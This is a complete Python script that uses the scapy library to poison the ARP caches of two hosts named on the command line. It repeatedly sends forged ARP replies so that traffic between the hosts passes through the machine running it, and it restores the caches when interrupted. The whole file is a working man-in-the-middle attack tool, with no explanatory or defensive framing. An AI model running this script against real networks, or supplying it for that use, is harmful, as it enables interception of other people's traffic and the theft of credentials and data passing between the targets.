#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse


def get_mac(ip):
    pack=scapy.ARP(pdst=ip)
    frame=scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_req=frame/pack
    answerd=scapy.srp(arp_req,timeout=1,verbose=False)[0]
    return answerd[0][1].hwsrc



def spoof(tip,sip):
    arpsp=scapy.ARP(op=2,psrc=sip,pdst=tip,hwdst=get_mac(tip))
    scapy.send(arpsp,verbose=False)


def unspoof(tip,cip):
    uscmac=get_mac(cip)
    arpusp = scapy.ARP(op=2, psrc=cip, pdst=tip, hwdst=get_mac(tip),hwsrc=uscmac)
    scapy.send(arpusp, count=4, verbose=False)
    time.sleep(1)

def parse():
    parser=optparse.OptionParser()
    parser.add_option('-f', '--target1', dest='target1', help='the ip of the first target that you wand to spoof')
    parser.add_option('-s', '--target2', dest='target2', help='the ip of the second target that you wand to spoof')
    (options,arguments)=parser.parse_args()
    return options
        



options=parse()
count=0
try:
    while True:
        spoof(options.target1,options.target2)
        spoof(options.target2,options.target1)
        print('\r[+] Packet('),
        print(count),
        print(') has been sent'),
        sys.stdout.flush()
        count+=2
        time.sleep(2)

except KeyboardInterrupt:
    print('\n\nCtrl+c detected.Rooling back...'),
    unspoof(options.target1, options.target2)
    print('...'),
    unspoof(options.target2, options.target1)
    print('...'),
    sys.stdout.flush()
    print('\n\nQuitting...\nDone.')





